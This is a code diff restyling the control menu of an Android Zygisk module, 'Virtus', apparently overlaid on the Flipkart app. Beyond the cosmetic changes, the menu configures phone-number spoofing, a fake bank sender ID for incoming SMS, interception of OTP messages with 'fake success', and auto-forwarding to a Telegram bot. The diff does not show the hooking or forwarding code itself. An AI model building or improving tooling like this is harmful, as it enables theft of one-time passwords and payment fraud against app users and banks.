@@ -645,8 +645,8 @@ public class HivirtusUiHelper {
         menuHost.setTag(TAG_MENU);
         menuHost.setVisibility(View.GONE);
         menuHost.setClickable(true);
-        // Dim backdrop — card beech me WebView se
-        menuHost.setBackgroundColor(0x99000000);
+        // Dim backdrop — fuller card so Flipkart white peeks kam
+        menuHost.setBackgroundColor(0xCC000000);
         menuHost.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -658,7 +658,7 @@ public class HivirtusUiHelper {
         return menuHost;
     }
 
-    /** Reference size: ~88% x ~55% portrait, centered (MotaGian-style card) */
+    /** Near full-screen card — kam white peeks around edges */
     private static FrameLayout.LayoutParams centeredCardLp(Context ctx) {
         android.util.DisplayMetrics dm = ctx.getResources().getDisplayMetrics();
         int sw = dm.widthPixels;
@@ -667,11 +667,11 @@ public class HivirtusUiHelper {
         int h;
         if (sw > sh) {
             // landscape
-            w = (int) (sw * 0.52f);
-            h = (int) (sh * 0.82f);
+            w = (int) (sw * 0.62f);
+            h = (int) (sh * 0.90f);
         } else {
-            w = (int) (sw * 0.88f);
-            h = (int) (sh * 0.55f);
+            w = (int) (sw * 0.94f);
+            h = (int) (sh * 0.78f);
         }
         FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(w, h);
         lp.gravity = Gravity.CENTER;
@@ -710,6 +710,10 @@ public class HivirtusUiHelper {
     private static void fillMenuWebView(Activity activity, FrameLayout menuHost) {
         if (menuHost.getChildCount() > 0) return;
         WebView web = new WebView(activity);
+        try {
+            web.setBackgroundColor(Color.TRANSPARENT);
+            web.setLayerType(View.LAYER_TYPE_HARDWARE, null);
+        } catch (Throwable ignored) {}
         WebSettings ws = web.getSettings();
         ws.setJavaScriptEnabled(true);
         ws.setDomStorageEnabled(true);
@@ -823,7 +827,7 @@ public class HivirtusUiHelper {
             LinearLayout shell = new LinearLayout(activity);
             shell.setOrientation(LinearLayout.VERTICAL);
             shell.setPadding(pad, pad, pad, pad);
-            shell.setBackground(roundBg(0xFF090B12, 18 * d));
+            shell.setBackground(roundBg(0xFF0C1220, 22 * d));
 
             // Header
             LinearLayout header = new LinearLayout(activity);
@@ -852,13 +856,13 @@ public class HivirtusUiHelper {
             LinearLayout titles = new LinearLayout(activity);
             titles.setOrientation(LinearLayout.VERTICAL);
             TextView name = new TextView(activity);
-            name.setText("Virtus");
+            name.setText("Virtus Zygisk Menu");
             name.setTextColor(Color.WHITE);
-            name.setTextSize(18f);
+            name.setTextSize(16f);
             name.getPaint().setFakeBoldText(true);
-            TextView sub = new TextView(activity);
-            sub.setText("Intercept + spoof ready");
-            sub.setTextColor(0xFF00C896);
+            final TextView sub = new TextView(activity);
+            sub.setText("Intercept on");
+            sub.setTextColor(0xFF3DD6A5);
             sub.setTextSize(12f);
             titles.addView(name);
             titles.addView(sub);
@@ -983,12 +987,34 @@ public class HivirtusUiHelper {
             row2.setOrientation(LinearLayout.HORIZONTAL);
             row2.setGravity(Gravity.CENTER_VERTICAL);
             TextView c2t = new TextView(activity);
-            c2t.setText("✉️  SMS Intercept + Fake Success\nBlock OTP SMS & fake success");
+            c2t.setText("✉️  SMS Intercept + Fake Success");
             c2t.setTextColor(Color.WHITE);
             c2t.setTextSize(13f);
+            final TextView c2sub = new TextView(activity);
+            c2sub.setText("Intercept on");
+            c2sub.setTextColor(0xFF3DD6A5);
+            c2sub.setTextSize(12f);
+            LinearLayout c2titles = new LinearLayout(activity);
+            c2titles.setOrientation(LinearLayout.VERTICAL);
+            c2titles.addView(c2t);
+            c2titles.addView(c2sub);
             final Switch swIntercept = new Switch(activity);
             try { swIntercept.setChecked(true); } catch (Throwable ignored) {}
-            row2.addView(c2t, new LinearLayout.LayoutParams(0, -2, 1f));
+            try {
+                swIntercept.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener() {
+                    @Override
+                    public void onCheckedChanged(android.widget.CompoundButton buttonView, boolean isChecked) {
+                        try {
+                            String label = isChecked ? "Intercept on" : "off";
+                            c2sub.setText(label);
+                            c2sub.setTextColor(isChecked ? 0xFF3DD6A5 : 0xFF7A879C);
+                            sub.setText(label);
+                            sub.setTextColor(isChecked ? 0xFF3DD6A5 : 0xFF7A879C);
+                        } catch (Throwable ignored) {}
+                    }
+                });
+            } catch (Throwable ignored) {}
+            row2.addView(c2titles, new LinearLayout.LayoutParams(0, -2, 1f));
             row2.addView(swIntercept);
             card2.addView(row2);
             cards.addView(card2, c2lp);
@@ -1039,10 +1065,16 @@ public class HivirtusUiHelper {
             Button save = new Button(activity);
             save.setText("Update / Save");
             save.setAllCaps(false);
-            save.setTextColor(Color.WHITE);
-            save.setBackground(roundBg(0xFF6C63FF, 14 * d));
+            save.setTextColor(0xFF061018);
+            save.setBackground(roundBg(0xFF3ECFCF, 14 * d));
             LinearLayout.LayoutParams saveLp = new LinearLayout.LayoutParams(-1, (int) (48 * d));
             saveLp.topMargin = (int) (12 * d);
+            final TextView saveStatus = new TextView(activity);
+            saveStatus.setText("");
+            saveStatus.setTextColor(0xFF3DD6A5);
+            saveStatus.setTextSize(13f);
+            saveStatus.setGravity(Gravity.CENTER);
+            saveStatus.getPaint().setFakeBoldText(true);
             save.setOnClickListener(new View.OnClickListener() {
                 @Override
                 public void onClick(View v) {
@@ -1058,17 +1090,32 @@ public class HivirtusUiHelper {
                         int slen = sid.length();
                         int tgon = (!token.isEmpty() && !chat.isEmpty()) ? 1 : 0;
                         writeDebug("ui_native_save_ok phone=" + plen + " sid=" + slen + " tg=" + tgon);
-                        save.setText("Saved OK");
+                        save.setText("Saved ✓");
+                        if (interceptOn) {
+                            saveStatus.setText("Intercept & Fake Success On ✅");
+                            saveStatus.setTextColor(0xFF3DD6A5);
+                        } else {
+                            saveStatus.setText("Intercept & Fake Success Off");
+                            saveStatus.setTextColor(0xFF7A879C);
+                        }
+                        String label = interceptOn ? "Intercept on" : "off";
+                        try {
+                            c2sub.setText(label);
+                            sub.setText(label);
+                        } catch (Throwable ignored) {}
                     } catch (Throwable t) {
                         writeDebug("ui_native_save_fail:" + safeMsg(t));
                     }
                 }
             });
             shell.addView(save, saveLp);
+            LinearLayout.LayoutParams stLp = new LinearLayout.LayoutParams(-1, -2);
+            stLp.topMargin = (int) (8 * d);
+            shell.addView(saveStatus, stLp);
 
             TextView credit = new TextView(activity);
-            credit.setText("Virtus Zygisk Mode • no LSPosed • @hivirtus");
-            credit.setTextColor(0xFF4A5068);
+            credit.setText("Virtus Zygisk Menu · @hivirtus");
+            credit.setTextColor(0xFF7A879C);
             credit.setTextSize(11f);
             credit.setGravity(Gravity.CENTER);
             LinearLayout.LayoutParams crLp = new LinearLayout.LayoutParams(-1, -2);
@@ -1085,7 +1132,7 @@ public class HivirtusUiHelper {
     private static void fillMenuFallback(Activity activity, FrameLayout menuHost) {
         if (menuHost.getChildCount() > 0) return;
         TextView tv = new TextView(activity);
-        tv.setText("Virtus Zygisk Mode\n\nTap logo / outside to close.\n@Hivirtus");
+        tv.setText("Virtus Zygisk Menu\n\nTap logo / outside to close.\n@Hivirtus");
         tv.setTextColor(Color.WHITE);
         tv.setTextSize(16f);
         tv.setPadding(48, 48, 48, 48);
@@ -1099,43 +1146,57 @@ public class HivirtusUiHelper {
             + "<meta name=viewport content='width=device-width,initial-scale=1'>"
             + "<style>"
             + "*{box-sizing:border-box;margin:0;padding:0}"
-            + "body{height:100%;background:#090b12;color:#eaeaea;font-family:sans-serif;padding:14px}"
-            + ".shell{height:100%;display:flex;flex-direction:column}"
+            + "html,body{height:100%;background:transparent;color:#edf2f7;font-family:sans-serif}"
+            + "body{display:flex}"
+            + ".shell{flex:1;height:100%;display:flex;flex-direction:column;padding:16px;"
+            + "border-radius:22px;background:radial-gradient(120% 80% at 0% 0%,rgba(62,207,207,.14),transparent 55%),"
+            + "linear-gradient(165deg,#0c1220,#070a10);border:1px solid rgba(62,207,207,.18)}"
             + ".top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}"
-            + ".name{font-weight:700;font-size:18px}.sub{color:#00c896;font-size:12px}"
+            + ".name{font-weight:700;font-size:16px}.sub{color:#3dd6a5;font-size:12px;font-weight:600}"
             + ".brand{display:flex;gap:12px;align-items:center}"
-            + ".mark,.mark-img{width:40px;height:40px;border-radius:50%;object-fit:cover;display:grid;place-items:center;"
-            + "background:linear-gradient(145deg,#5c6bc0,#1a237e);color:#fff;font-weight:700;box-shadow:0 8px 20px rgba(108,99,255,.4)}"
-            + ".card{background:#13151f;border-radius:14px;padding:14px;margin-bottom:10px}"
-            + "h3{font-size:14px;margin-bottom:4px}p{color:#4a5068;font-size:12px}"
-            + "input[type=text],input[type=tel]{width:100%;margin-top:10px;padding:12px;border-radius:10px;border:0;background:#090b12;color:#fff}"
+            + ".mark,.mark-img{width:42px;height:42px;border-radius:50%;object-fit:cover;display:grid;place-items:center;"
+            + "background:linear-gradient(145deg,#3ecfcf,#2a6bff);color:#061018;font-weight:700}"
+            + ".card{background:rgba(18,24,38,.92);border-radius:16px;padding:14px;margin-bottom:10px;border:1px solid rgba(120,150,190,.12)}"
+            + "h3{font-size:14px;margin-bottom:2px}p{color:#7a879c;font-size:12px;font-weight:600}"
+            + "input[type=text],input[type=tel]{width:100%;margin-top:10px;padding:12px;border-radius:10px;border:0;background:#05080e;color:#fff}"
             + ".row{display:flex;align-items:center;justify-content:space-between;gap:10px}"
-            + ".primary{margin-top:auto;width:100%;padding:14px;border:0;border-radius:14px;background:#6c63ff;color:#fff;font-weight:700}"
-            + ".credit{display:block;text-align:center;margin-top:8px;color:#4a5068;font-size:11px}"
+            + ".primary{margin-top:auto;width:100%;padding:14px;border:0;border-radius:14px;"
+            + "background:linear-gradient(135deg,#3ecfcf,#5b8cff);color:#061018;font-weight:700}"
+            + ".save-status{text-align:center;margin-top:8px;color:#3dd6a5;font-size:13px;font-weight:700;min-height:18px}"
+            + ".credit{display:block;text-align:center;margin-top:8px;color:#7a879c;font-size:11px}"
             + "</style></head><body><div class=shell>"
             + "<div class=top><div class=brand><span class=mark>V</span>"
-            + "<div><div class=name>Virtus</div><div class=sub>Intercept + spoof ready</div></div></div></div>"
+            + "<div><div class=name>Virtus Zygisk Menu</div><div class=sub id=statusLine>Intercept on</div></div></div></div>"
             + "<div class=card><div class=row><div><h3>Fake Phone Number</h3><p>Override number shown to apps</p></div>"
             + "<input type=checkbox id=swF></div><input type=tel id=phone placeholder='+91 XXXXX XXXXX'></div>"
             + "<div class=card><h3>Sender ID</h3><p>Incoming SMS pe yeh naam</p>"
             + "<input type=text id=sender placeholder='MYBANK'></div>"
-            + "<div class=card><div class=row><div><h3>SMS Intercept + Fake Success</h3><p>Block OTP SMS & fake success</p></div>"
+            + "<div class=card><div class=row><div><h3>SMS Intercept + Fake Success</h3><p id=interceptHint>Intercept on</p></div>"
             + "<input type=checkbox id=swI checked></div></div>"
             + "<div class=card><h3>Telegram</h3><p>Bot token + Chat ID</p>"
             + "<input type=text id=token placeholder='123456:ABC…'>"
             + "<input type=text id=chat placeholder='-100123…'></div>"
             + "<button class=primary id=save>Update / Save</button>"
-            + "<span class=credit>Virtus Zygisk Mode • no LSPosed • @hivirtus</span></div>"
+            + "<div class=save-status id=saveStatus></div>"
+            + "<span class=credit>Virtus Zygisk Menu · @hivirtus</span></div>"
             + "<script>(function(){var H=window.Hivirtus;"
+            + "function paint(){var on=document.getElementById('swI').checked;"
+            + "var t=on?'Intercept on':'off';"
+            + "document.getElementById('statusLine').textContent=t;"
+            + "document.getElementById('statusLine').style.color=on?'#3dd6a5':'#7a879c';"
+            + "document.getElementById('interceptHint').textContent=t;"
+            + "document.getElementById('interceptHint').style.color=on?'#3dd6a5':'#7a879c';}"
             + "try{if(H&&H.readConfig){var c=JSON.parse(H.readConfig()||'{}');"
             + "if(c.mock_phone_sim1)document.getElementById('phone').value=c.mock_phone_sim1;"
             + "if(c.inject_sender_id)document.getElementById('sender').value=c.inject_sender_id;"
             + "if(c.telegram_bot_token)document.getElementById('token').value=c.telegram_bot_token;"
             + "if(c.telegram_chat_id)document.getElementById('chat').value=c.telegram_chat_id;"
-            + "if(c.enable_sim1_mock||c.fake_number_enabled)document.getElementById('swF').checked=true;}}catch(e){}"
-            + "document.getElementById('save').onclick=function(){var j=JSON.stringify({"
-            + "hook_outgoing_sms:document.getElementById('swI').checked,"
-            + "intercept_fake_success:document.getElementById('swI').checked,"
+            + "if(c.enable_sim1_mock||c.fake_number_enabled)document.getElementById('swF').checked=true;"
+            + "if(c.intercept_fake_success===false||c.intercept_enabled===false)document.getElementById('swI').checked=false;}}catch(e){}"
+            + "document.getElementById('swI').onchange=paint;paint();"
+            + "document.getElementById('save').onclick=function(){var on=document.getElementById('swI').checked;var j=JSON.stringify({"
+            + "hook_outgoing_sms:on,"
+            + "intercept_fake_success:on,"
             + "enable_sim1_mock:document.getElementById('swF').checked,"
             + "enable_phone_spoof:document.getElementById('swF').checked,"
             + "mock_phone_sim1:document.getElementById('phone').value||'',"
@@ -1144,7 +1205,9 @@ public class HivirtusUiHelper {
             + "telegram_chat_id:document.getElementById('chat').value||'',"
             + "auto_forward_token:!!(document.getElementById('token').value&&document.getElementById('chat').value),"
             + "override_incoming_sender:!!document.getElementById('sender').value});"
-            + "try{if(H)H.saveConfig(j);document.getElementById('save').textContent='Saved ✓';}catch(e){}};})();</script>"
+            + "try{if(H)H.saveConfig(j);document.getElementById('save').textContent='Saved ✓';"
+            + "document.getElementById('saveStatus').textContent=on?'Intercept & Fake Success On ✅':'Intercept & Fake Success Off';"
+            + "document.getElementById('saveStatus').style.color=on?'#3dd6a5':'#7a879c';paint();}catch(e){}};})();</script>"
             + "</body></html>";
 
     private static String safeMsg(Throwable t) {
